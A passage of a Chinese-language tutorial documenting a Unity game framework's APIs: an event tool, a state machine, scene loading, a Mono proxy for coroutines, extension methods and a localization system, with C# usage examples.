xx<span class="hljs-selector-class">.OnDestroy</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnDestroy</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnDestroy</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnDestroy</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//简单实例</span>
void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnDestroy</span>(Test4, <span class="hljs-number">4</span>);
}
private void <span class="hljs-built_in">Test4</span>(GameObject arg1, int arg4)
{
    Debug<span class="hljs-selector-class">.Log</span>(arg4);
    cube<span class="hljs-selector-class">.RemoveOnDestroy</span>&lt;int&gt;(Test4);
}
</code></pre>
<ul>
<li>xx为绑定事件的对象组件，使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-92">移除一类事件</h4>
<p>移除鼠标/碰撞/触发/资源的一类所有事件。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//int customEventTypeInt, JKEventType eventType</span>
<span class="hljs-built_in">RemoveAllListener</span>(customEventTypeInt);
<span class="hljs-built_in">RemoveAllListener</span>(eventType);
<span class="hljs-built_in">RemoveAllListener</span>();
</code></pre>
<ul>
<li>customEventTypeInt/eventType为事件的类型，对应碰撞、鼠标事件对应的枚举类型或自定义事件的类型int值。</li>
<li>不填则移除所有事件。</li>
</ul>
<h3 data-id="heading-93">使用值元组传递多个事件参数</h3>
<p>通过ValueTuple封装一个简单的参数列表结构体。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Start</span>()</span>
    {
        cube.OnClick(Test5, (arg1: <span class="hljs-number">2</span>, arg2: <span class="hljs-string">"test"</span>, arg3: <span class="hljs-literal">true</span>));
        <span class="hljs-comment">//等同于下一行代码，上一行更简便，参数类型可以自动推断出</span>
        cube.OnClick(Test5, ValueTuple.Create&lt;<span class="hljs-built_in">int</span>,<span class="hljs-built_in">string</span>,<span class="hljs-built_in">bool</span>&gt;(<span class="hljs-number">1</span>,<span class="hljs-string">"test"</span>,<span class="hljs-literal">true</span>));
    }


    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Test5</span>(<span class="hljs-params">PointerEventData arg1, (<span class="hljs-built_in">int</span> arg1, <span class="hljs-built_in">string</span> arg2, <span class="hljs-built_in">bool</span> arg3</span>) args)</span>
    {
        Debug.Log(<span class="hljs-string">$"<span class="hljs-subst">{args.arg1}</span>,<span class="hljs-subst">{args.arg2}</span>,<span class="hljs-subst">{args.arg3}</span>"</span>);
        cube.RemoveOnClick&lt;(<span class="hljs-built_in">int</span> arg1, <span class="hljs-built_in">string</span> arg2, <span class="hljs-built_in">bool</span> arg3)&gt;(Test5);
    }
</code></pre>
<h3 data-id="heading-94">自定义事件类型</h3>
<p>以上鼠标、碰撞等事件的触发由事件工具结合特定的时机自动完成，如果希望自定义事件的触发逻辑，则需要添加新的事件类型,对应在适合的地方触发事件，此时事件工具的作用与事件系统类似，区别在于不需要为对象挂载脚本。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(this Component com, int customEventTypeInt, Action&lt;T, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.AddEventListener</span>&lt;T, TEventArg&gt;(customEventTypeInt, action, args);
xx<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T, TEventArg&gt;(customEventTypeInt, action);
cube<span class="hljs-selector-class">.TriggerCustomEvent</span>&lt;<span class="hljs-attribute">Transform</span>&gt;((int)myType<span class="hljs-selector-class">.CustomType</span>, <span class="hljs-attribute">transform</span>);


<span class="hljs-comment">//使用示例</span>
    void <span class="hljs-built_in">Start</span>()
    {
        cube<span class="hljs-selector-class">.AddEventListener</span>&lt;<span class="hljs-attribute">Transform</span>, int&gt;((int)myType<span class="hljs-selector-class">.CustomType</span>, Test6, <span class="hljs-number">1</span>);
    }


    private void <span class="hljs-built_in">Test6</span>(Transform arg1, int arg2)
    {
        Debug<span class="hljs-selector-class">.Log</span>(arg1.position = Vector3.zero);
        cube<span class="hljs-selector-class">.RemoveEventListener</span>&lt;<span class="hljs-attribute">Transform</span>, int&gt;((int)myType<span class="hljs-selector-class">.CustomType</span>, Test6);
    }
    enum myType
    {
        CustomType = <span class="hljs-number">0</span>,
    }
</code></pre>
<ul>
<li>customEventTypeInt是自定义的事件类型，是一个int值，可以使用枚举对应事件的类型。</li>
<li>T指明了自定义事件所使用的eventData，可以在触发的时候传入T以供使用，等同于Collision/Collider/PointerEventData。</li>
<li>args是参数列表。</li>
</ul>
<h3 data-id="heading-95">补充说明</h3>
<ul>
<li>事件工具针对的事件触发时都会提供eventData用于获取触发时的特定数据用于操作（有点类似于异步callback回调时传的那个参数），比如PointerEventData，因此他们与对象绑定，就算不传任何参数，触发时还是可以根据eventData去获取一些信息，比如碰撞发生的位置。</li>
<li>开发事件工具的目的在于快速为游戏对象添加一类事件的监听，而不需要为其手动挂载脚本（类似于button.OnClick.AddEventListener,但Unity只支持按钮的自动添加，而事件工具支持常见的所有事件类型），实际上会自动为其自动挂载JKEventListener脚本，其中有对应事件的监听方法以及内置碰撞/鼠标等事件的触发方法。</li>
<li>自定义事件类型是支持的，但此时事件的类型，触发需要自己实现。</li>
<li>事件系统作用在于解耦对象和事件触发的逻辑，让事件中心保存监听的方法，触发时不需要访问对象。而事件工具所负责的是一类与对象强关联的事件，用于解耦对象和事件监听添加的逻辑，不需要手动挂载脚本。二者联动的效果就是A使用事件工具直接为B添加事件监听C，C内部再通过事件系统包一层添加事件监听D，这样外界就可以通过直接访问事件中心触发D（可能的应用场景比如要给所有子弹添加碰撞分解效果，这样无论是事件监听添加还是事件的触发都可以在一个脚本中完成，不需要手动给所有子弹度挂载脚本，也不需要触发时访问所有子弹对象）。</li>
</ul>
<h2 data-id="heading-96">状态机</h2>
<p>游戏中的状态机（state machine）是一种在编程中常用的概念，它用于表示对象或系统的状态以及从一个状态到另一个状态的转换。在游戏中，状态机通常被用于表示游戏对象的状态，例如玩家角色的行动状态，或者敌人的攻击状态。每个状态都有一个特定的行为或属性，而状态之间的转换通常是由特定的事件触发的，例如按下某个按钮或达到某个条件。框架中提供了状态基类和转换功能逻辑。</p>
<h3 data-id="heading-97">状态机的初始化</h3>
<p>使用状态机，本质就是持有状态机脚本的引用与其绑定，为此控制脚本（比如角色控制器PlayerController）需要持有状态机对象,其也是一类脚本资源，可以通过资源系统进行回收管理。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//API</span>
stateMachine.Init&lt;T&gt;(owner);
stateMachine.Init(owner);
<span class="hljs-comment">//简单实例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlayerController</span> : <span class="hljs-type">MonoBehaviour</span>, <span class="hljs-type">IStateMachineOwner</span>
{
    StateMachine stateMachine;
    <span class="hljs-keyword">private</span> void Start()
    {
        stateMachine = ResSystem.GetOrNew&lt;StateMachine&gt;();
        <span class="hljs-comment">//初始化时进入默认状态Idle</span>
        stateMachine.Init&lt;PlayerIdleState&gt;(<span class="hljs-keyword">this</span>);
  
        <span class="hljs-comment">//初始化时不进入默认状态</span>
        stateMachine.Init(<span class="hljs-keyword">this</span>);
    }
}
</code></pre>
<ul>
<li>PlayerController需要继承IStateMachineOwner接口，目的是限制Init中填入的对象必须为接口子类;</li>
<li>宿主owner用于将PlayerController作为引用传递给stateMachine，因为stateMachine不继承MonoBehavior，想要获取PlayerController的引用相对麻烦，所以直接传递引用。</li>
<li>T（PlayerIdleState）是初始的状态类，使用参数时会自动进入T状态，不填则状态机待机，等待进入新状态。</li>
</ul>
<h3 data-id="heading-98">状态类</h3>
<p>每一个状态实际都是一个状态类脚本，状态机通过切换调用其中的方法完成状态逻辑的切换，状态类脚本继承自状态基类StateBase，包含状态的初始化、进入、退出、Unity生命周期函数（虽然不继承MonoBehaviour，通过托管系统可以实现），初始化只执行一次，可以通过StateMachine调用state的Init方法传递过来的owner获取宿主的信息，比如在角色移动的相关状态中就可以获取Player的Transform组件。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PlayerIdleState</span>:<span class="hljs-title">StateBase</span>
{
    Transform transform;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Init</span>(<span class="hljs-params">IStateMachineOwner owner</span>)</span>
    {
        transform = ((PlayerController)owner).transform;
    }


    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Enter</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Enter();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Exit</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Exit();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Update</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Update();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">FixedUpdate</span>()</span>
    {
        <span class="hljs-keyword">base</span>.FixedUpdate();
    }


    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">LateUpdate</span>()</span>
    {
        <span class="hljs-keyword">base</span>.LateUpdate();
    }
}
</code></pre>
<h3 data-id="heading-99">状态的切换</h3>
<p>在切换状态时，状态类会先被获取并存储起来供下次重复使用，当前状态的所有方法停止工作，切换到新状态的方法执行,在实际使用时，可以再封装一层ChangeState逻辑使用枚举与不同的状态类对应，简化代码。</p>
<pre><code class="hljs language-ini" lang="ini">//API
//(bool <span class="hljs-attr">reCurrstate</span> = <span class="hljs-literal">false</span>)
stateMachine.ChangeState&lt;T&gt;(reCurrstate)
</code></pre>
<ul>
<li>reCurrstate指当前状态和要切换的状态相同时是否还要切换，默认为False相同状态不执行切换。</li>
</ul>
<h3 data-id="heading-100">状态共享数据</h3>
<p>为owner-stateMachine下的所有状态提供共享字典。</p>
<pre><code class="hljs language-scss" lang="scss">public void <span class="hljs-built_in">ShareData</span>()<span class="hljs-comment">//状态类内</span>
{
    <span class="hljs-comment">//(string key, object data)</span>
    <span class="hljs-built_in">RemoveShareData</span>("test");
    <span class="hljs-built_in">ContainsShareData</span>("test");
    <span class="hljs-built_in">AddShareData</span>("test",<span class="hljs-number">1</span>);
    int result = <span class="hljs-number">0</span>;
    TryGetShareData&lt;int&gt;("test", out result);
    <span class="hljs-built_in">UpdateShareData</span>("test", <span class="hljs-number">1</span>);
    <span class="hljs-built_in">CleanShareData</span>();
  
    stateMachine<span class="hljs-selector-class">.CleanShareData</span>();
  
}
</code></pre>
<ul>
<li>key,data是需要共享的字典数据，提供CRUD的API，共享数据可以在状态类内使用，也可以通过stateMachine调用API进行CRUD。</li>
</ul>
<h3 data-id="heading-101">状态机状态清空与销毁</h3>
<ul>
<li>状态机停止工作Stop时会清空所保存的所有状态类放入对象池，状态机本身与宿主的引用仍旧保留，可供下次直接使用。</li>
<li>状态机销毁时Destroy除停止工作外会释放与宿主的引用关系，并将自己放回对象池回收利用。</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">stateMachine.Stop()<span class="hljs-comment">;</span>
stateMachine.Destroy()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-102">场景系统</h2>
<p>场景系统提供了正常加载场景和异步加载的若干API。</p>
<h3 data-id="heading-103">正常加载场景</h3>
<pre><code class="hljs language-ini" lang="ini">//API
//(string sceneName, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)
SceneSystem.LoadScene(sceneName, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)<span class="hljs-comment">;</span>
//(int sceneBuildIndex, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)
SceneSystem.LoadScene(sceneBuildIndex, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)<span class="hljs-comment">;</span>
//(string sceneName, LoadSceneParameters loadSceneParameters)
SceneSystem.LoadScene(sceneName, loadSceneParameters)<span class="hljs-comment">;</span>
//(int sceneBuildIndex, LoadSceneParameters loadSceneParameters)
SceneSystem.LoadScene(sceneBuildIndex, loadSceneParameters)<span class="hljs-comment">;</span>


//使用实例 加载SampleScene场景并Destroy当前场景
SceneSystem.LoadScene("SampleScene",LoadSceneMode.Single)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>sceneName对应BuildSetting中的场景名。</li>
<li>sceneBuildIndex对应BuildSetting中的场景索引号。</li>
<li>mode是场景的加载模式，默认为Single表示加载新场景会销毁当前场景，Additive则保留当前场景，将新场景加入到当前场景中。</li>
<li>loadSceneParameters是场景加载的参数，除可指定加载模式外，还可指定优先级等，具体如图。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6b5b8f9bbfc4dab84262005d24e4078~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=G8y3ir5iNkqLV65VznxkcYeFR%2Bg%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-104">异步加载场景</h3>
<p>异步加载场景可在加载大规模场景时不阻塞主线程，而是通过协程或回调等方式在后台加载场景资源，并在加载完成后通知游戏主线程。</p>
<p>异步加载过程中主线程获取进度的方式有两种：</p>
<ul>
<li>场景系统异步加载时会将加载进度传递到事件中心中，可以通过监听"LoadingSceneProgress"、"LoadSceneSucceed"事件获取加载进度。</li>
<li>异步加载提供了回调事件参数，可以通过传入回调函数获取加载进度。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(string sceneName, Action&lt;float&gt; callBack = null, LoadSceneMode mode = LoadSceneMode.Single)</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>(sceneName, callBack, mode);
<span class="hljs-comment">//(int sceneBuildIndex, Action&lt;float&gt; callBack = null, LoadSceneMode mode = LoadSceneMode.Single)</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>(sceneBuildIndex, callBack, mode);


<span class="hljs-comment">//简单实例 异步加载场景SampleScene并实时输出加载进度，在加载完成时输出Success</span>
<span class="hljs-comment">//方式1 监听事件获取加载进度</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>("SampleScene");
<span class="hljs-comment">//(float不写也行,"LoadingSceneProgress"、"LoadSceneSucceed"为固定名称)</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;<span class="hljs-attribute">float</span>&gt;("LoadingSceneProgress", LoadProgress);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>("LoadSceneSucceed");


<span class="hljs-comment">//方式2 传入回调事件callBack</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>("SampleScene", LoadProgress);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>("LoadSceneSucceed");


void <span class="hljs-built_in">LoadProgress</span>(float progress)
{
    Debug<span class="hljs-selector-class">.Log</span>(progress);
}
void <span class="hljs-built_in">LoadSceneSucceed</span>()
{
    Debug<span class="hljs-selector-class">.Log</span>("Success");
}
</code></pre>
<ul>
<li>sceneName对应BuildSetting中的场景名。</li>
<li>sceneBuildIndex对应BuildSetting中的场景索引号。</li>
<li>mode是场景的加载模式，默认为Single表示加载新场景会销毁当前场景，Additive则保留当前场景，将新场景加入到当前场景中。</li>
<li>callBack是float参数无返回值回调事件，用于获取加载进度。</li>
</ul>
<h2 data-id="heading-105">Mono代理系统</h2>
<p>Mono代理系统用于不继承MonoBehavior的脚本启用mono生命周期函数和协程，比如状态机里的状态类，场景系统异步加载时的协程，除代理系统外框架中的各系统都是静态工具类，需要使用Mono的相关方法则通过代理系统完成，因此也只有MonoSystem挂载在面板上，其内部实现是单例。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d08b0bf0c7694e40b145f8440c2771e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=ikcwiF5cIGX7nDRN%2B0PhL9q%2FSKU%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-106">Mono生命周期函数</h3>
<p>将需要在Update、LateUpdate。FixedUpdate实际执行的逻辑托管给MonoSystem。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//(Action action)</span>
MonoSystem<span class="hljs-selector-class">.AddUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.RemoveUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.AddLateUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.RemoveLateUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.AddFixedUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.RemoveFixedUpdateListener</span>(action);
</code></pre>
<ul>
<li>action是要在生命周期执行的无参无返回值方法。</li>
</ul>
<h3 data-id="heading-107">协程</h3>
<p>启动/停止协程。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//启动/停止一个协程</span>
<span class="hljs-comment">//(IEnumerator coroutine)</span>
MonoSystem<span class="hljs-selector-class">.Start_Coroutine</span>(coroutine);
<span class="hljs-comment">//(Coroutine routine)</span>
MonoSystem<span class="hljs-selector-class">.Stop_Coroutine</span>(routine);


<span class="hljs-comment">//启动/停止一个协程序并且绑定某个对象</span>
<span class="hljs-comment">//(object obj,IEnumerator coroutine)</span>
MonoSystem<span class="hljs-selector-class">.Start_Coroutine</span>(obj, coroutine);
<span class="hljs-comment">//(object obj,Coroutine routine)</span>
MonoSystem<span class="hljs-selector-class">.Stop_Coroutine</span>(obj, routine);


<span class="hljs-comment">//停止某个对象绑定的所有协程</span>
MonoSystem<span class="hljs-selector-class">.StopAllCoroutine</span>(obj);


<span class="hljs-comment">//停止所有协程</span>
MonoSystem<span class="hljs-selector-class">.StopAllCoroutine</span>();
</code></pre>
<ul>
<li>coroutine是一个迭代器，定义了协程。</li>
<li>routine是要停止的协程。</li>
<li>obj是与协程绑定的对象，可以用于区分不同对象上的相同协程。</li>
</ul>
<h2 data-id="heading-108">协程工具</h2>
<p>提前new好协程所需要的WaitForEndOfFrame、WaitForFixedUpdate、YieldInstruction类的对象,避免GC。</p>
<pre><code class="hljs language-scss" lang="scss">CoroutineTool<span class="hljs-selector-class">.WaitForEndOfFrame</span>();
CoroutineTool<span class="hljs-selector-class">.WaitForFixedUpdate</span>();
<span class="hljs-comment">//(float time)</span>
CoroutineTool<span class="hljs-selector-class">.WaitForSeconds</span>(time);
<span class="hljs-comment">//(float time)不受TimeScale影响</span>
CoroutineTool<span class="hljs-selector-class">.WaitForSecondsRealtime</span>(time);
<span class="hljs-comment">//(int count=1)</span>
CoroutineTool<span class="hljs-selector-class">.WaitForFrames</span>(count);
CoroutineTool<span class="hljs-selector-class">.WaitForFrame</span>();


<span class="hljs-comment">//使用示例</span>
private static IEnumerator <span class="hljs-built_in">DoLoadSceneAsync</span>(...)
{
    yield return CoroutineTool<span class="hljs-selector-class">.WaitForFrame</span>();
}
</code></pre>
<h2 data-id="heading-109">扩展方法</h2>
<p>框架提供了若干扩展方法用于快速调用与对象强关联的系统方法。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//比较两个对象数组,返回bool</span>
<span class="hljs-comment">//(this object[] objs, object[] other)</span>
xx<span class="hljs-selector-class">.ArraryEquals</span>(other);


<span class="hljs-comment">//调用MonoSystem添加/移除生命周期函数</span>
<span class="hljs-comment">//(this object obj, Action action)</span>
xx<span class="hljs-selector-class">.AddUpdate</span>(action);
xx<span class="hljs-selector-class">.removeUpdate</span>(action);
xx<span class="hljs-selector-class">.AddLateUpdate</span>(action);
xx<span class="hljs-selector-class">.RemoveLateUpdate</span>(action);
xx<span class="hljs-selector-class">.AddFixedUpdate</span>(action);
xx<span class="hljs-selector-class">.RemoveLateUpdate</span>(action);


<span class="hljs-comment">//调用MonoSystem启动/停止协程（绑定此对象）</span>
<span class="hljs-comment">//(this object obj, IEnumerator routine)</span>
xx<span class="hljs-selector-class">.StartCoroutine</span>(routine);
<span class="hljs-comment">//(this object obj, Coroutine routine)</span>
xx<span class="hljs-selector-class">.StopCoroutine</span>(routine);
xx<span class="hljs-selector-class">.StopAllCoroutine</span>();


<span class="hljs-comment">//判断GameObject是否为空，返回bool</span>
xx<span class="hljs-selector-class">.IsNull</span>();


<span class="hljs-comment">//当前对象放入对象池</span>
<span class="hljs-comment">//(this GameObject go)</span>
xx<span class="hljs-selector-class">.GameObjectPushPool</span>();
<span class="hljs-comment">//(this Component com)</span>
xx<span class="hljs-selector-class">.GameObjectPushPool</span>();
<span class="hljs-comment">//(this object obj)</span>
xx<span class="hljs-selector-class">.ObjectPushPool</span>();
</code></pre>
<h2 data-id="heading-110">本地化系统</h2>
<p>用于切换不同语言对应的文字素材和图片素材，主要用于UI。</p>
<h3 data-id="heading-111">本地化配置文件的创建</h3>
<p>project面板右键创建Localzation Config，通过SO的方式记录语言配置，红色框为一类素材的key，对应下属若干不同语言的素材，支持文字string或者图片Sprite内容，使用时通过调用这里的资源进行切换，可以作为全局或者专属于某一UI对象的本地化配置文件（即持有此config的SO并通过key和languagetype获取本地化内容）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/228c85809a5540029cd1c8909adc18a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=%2FpdToizbWdXcuYniBUaIvi485PU%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-112">全局配置</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47ea27bb38254acd90a6f296ed9f30be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=%2Fi7Um6nb4ApYNF4aL4iKFnZFctI%3D" alt="alt" loading="lazy"/>​</p>
<p>将创建的Config拖拽给JKFrame下的LocalizationSystem组件，全局的本地化配置绑定完成，通过修改LocalizationSystem的LanguageType修改语言。（可以在运行时下修改全局配置）</p>
<h3 data-id="heading-113">API</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//切换全局配置的当前语言类型（面板上显示的那个）</span>
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">LanguageType</span> <span class="hljs-operator">=</span> <span class="hljs-type">LanguageType</span>.<span class="hljs-type">SimplifiedChinese</span>;
<span class="hljs-comment">//注册/注销语言更新时触发的事件（含有LanguageType参数的无返回值方法）</span>
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">RegisterLanguageEvent</span>(<span class="hljs-type">Action</span>&lt;<span class="hljs-type">LanguageType</span>&gt; action)
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">UnregisterLanguageEvent</span>(<span class="hljs-type">Action</span>&lt;<span class="hljs-type">LanguageType</span>&gt; action)
<span class="hljs-comment">//获取全局配置文件的某一语言下的数据（文本/图片）</span>
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">T</span>&gt;(string key, <span class="hljs-type">LanguageType</span> languageType)
<span class="hljs-comment">//继承UIWindowBase的窗口脚本可以重写语言更新事件</span>
<span class="hljs-keyword">override</span> void <span class="hljs-type">OnUpdateLanguage</span>(<span class="hljs-type">LanguageType</span> languageType)


<span class="hljs-comment">//使用案例</span>
<span class="hljs-comment">//1.通过脚本直接获得全局本地化配置的数据内容</span>
<span class="hljs-comment">//文本string</span>
string info <span class="hljs-operator">=</span> <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">LocalizationStringData</span>&gt;(<span class="hljs-string">"标题"</span>, <span class="hljs-type">LanguageType</span>.<span class="hljs-type">SimplifiedChinese</span>).content;<span class="hljs-comment">//指定中文</span>
string info <span class="hljs-operator">=</span> <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">LocalizationStringData</span>&gt;(<span class="hljs-string">"标题"</span>, <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">LanguageType</span>).content;<span class="hljs-comment">//当前全局本地化配置的语言</span>
<span class="hljs-comment">//Sprite图片</span>
<span class="hljs-type">Sprite</span> image <span class="hljs-operator">=</span> <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">LocalizationImageData</span>&gt;(<span class="hljs-string">"标题图片"</span>, <span class="hljs-type">LanguageType</span>.<span class="hljs-type">SimplifiedChinese</span>).content;


<span class="hljs-comment">//2.通过Collecter由拖拽的方式绑定UI组件和语言配置（见下一小节）</span>
<span class="hljs-comment">//3.通过重写OnUpdateLanguage定制语言更新时的事件触发（见下一小节）</span>
   
</code></pre>
<ul>
<li>action是一个含有languageType的单参数无返回值方法，用于结合传入的语言类型定制触发事件逻辑。</li>
<li>泛型T（LocalizationStringData/LocalizationImageData）用于限定GetContent返回的数据类型，目前支持string和Sprite，可以进行拓展。</li>
<li>key是本地化配置文件SO中的数据key。</li>
<li>LocalizationSystem.LanguageType是当前游戏的语言类型，修改会触发索引中的语言更新方法，进而触发所有窗口的语言更新事件修改语言类型。</li>
</ul>
<h3 data-id="heading-114">UI特化工具及局部配置</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2c41502382f49a08204dfa426836112~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=kSB0YjugRXTn%2B1M3jefVcAFdBhM%3D" alt="alt" loading="lazy"/>​</p>
<ul>
<li>在UI框架中继承UIWindowBase的窗口类会自动持有一个本地化配置A用于窗口的局部配置（可用可不用，只是提供了一个数据传入的接口）。</li>
<li>方便起见，，直接通过面板拖拽的方式转递对象和其对应的配置数据key（任一语言即可），即完成了本地化配置，无需通过脚本访问（比如Title文本组件对应配置中的标题key）。注意，此时的Localization Config是一个专属于此UI的局部配置文件（且与持有的本地化配置A可以不同）。</li>
</ul>
<p>PS:当局部配置找不到对应的key时，底层规定会去全局本地化配置表里寻找。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f2b934c78274f5281b4c920d0f867aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=OL5Gnj72FCqHeyin%2BDREPaJy9Pw%3D" alt="alt" loading="lazy"/>​</p>
<p>集成了UI_WindowBase的UI窗口类可以通过重写OnUpdateLanguage方法定制语言更新时的事件触发，比如文字拼接部分更新。</p>
<pre><code class="hljs language-ini" lang="ini">    public Text test<span class="hljs-comment">;</span>
    protected override void OnUpdateLanguage(LanguageType languageType) {
        string <span class="hljs-attr">info</span> = LocalizationSystem.GetContent&lt;LocalizationStringData&gt;(<span class="hljs-string">"标题"</span>, languageType).content<span class="hljs-comment">;</span>
        info += "test"<span class="hljs-comment">;</span>
        <span class="hljs-attr">test.text</span> = info<span class="hljs-comment">;</span>
    }
</code></pre>
<h3 data-id="heading-115">拓展</h3>
<p>尽管本地化系统目前仅支持文字和Sprite的切换，但是对于音效，配音等资源的切换也可以很方便拓展，这部分功能就不做预制了，由开发者自行拓展，以下是拓展思路。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//拓展API</span>
<span class="hljs-comment">//获取全局配置文件的某一语言下的数据（文本/图片）</span>
LocalizationSystem.GetContent&lt;T&gt;(string key, LanguageType languageType)


<span class="hljs-comment">//拓展位置  LocalizationData.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationDataBase</span>
{
}
